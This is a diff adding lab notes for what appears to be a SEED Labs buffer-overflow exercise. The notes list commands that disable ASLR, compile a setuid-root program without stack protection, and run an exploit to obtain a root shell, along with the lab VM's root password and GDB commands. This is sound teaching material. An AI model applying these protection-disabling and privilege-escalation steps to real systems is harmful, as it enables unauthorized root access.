@@ -1,0 +1,31 @@
+/*------  STEP 0 ------*/
+/* Login as root: */
+  $ su root
+  password: seedubuntu
+  -------------
+  $ sysctl -w kernel.randomize_va_space=0     /* Disable ASLR */
+  -------------
+  $ gcc -z execstack -o call_shellcode call_shellcode.c
+  $ ./call_shellcode                          /* Test call_shellcode.c */
+    #                                         /* If a shell pops out, you should be good to go*/
+/*------  STEP 1 ------*/
+  $ su root
+  password: seedubuntu
+  
+  $ gcc -fno-stack-protector -z execstack -g -o stack stack.c    /* Compile stack.c */
+  $ chmod 4755 stack
+  $ exit                                                         /* Here we go back to seed user */
+/*------  STEP 2 ------*/
+  $ gcc -o exploit exploit.c          /* Compile exploit.c, in seed user */
+/*------  STEP 3 ------*/
+  $./exploit                          /* At seed user */
+  $./stack
+  #                                   /* Should have a shell now */
+/*---- GDB COMMANDS ----*/
+  $ gdb -q stack
+  $ list <line #START>, <line #END>   /* e.g., list 1, 20 */
+  $ (gdb) break <line #>              /* e.g., break 24, break 14 */
+  $ (gdb) break <function_name>       /* e.g., break bof, break main */
+  $ run
+  $ print &str_main
+  $ x/128x buffer
